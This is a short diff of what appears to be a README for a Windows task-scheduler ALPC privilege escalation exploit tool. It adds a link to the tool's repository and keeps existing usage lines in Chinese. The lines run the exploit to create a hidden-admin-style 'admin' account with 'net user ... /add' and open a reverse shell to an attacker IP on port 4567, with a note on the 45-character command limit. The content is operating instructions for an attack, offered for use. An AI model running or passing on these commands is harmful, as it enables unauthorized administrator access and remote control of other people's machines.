@@ -2,3 +2,4 @@
 ALPC-TaskSched-LPE.exe -e "net user admin 1234567@ /add"  
 这里我给限制成45个字符了懒得改了不改了要执行程序用请用绝对路径  
 ALPC-TaskSched-LPE.exe -g ip 反弹到ip的4567端口  
+详细介绍:https://github.com/WBGlIl/EXP-LPE
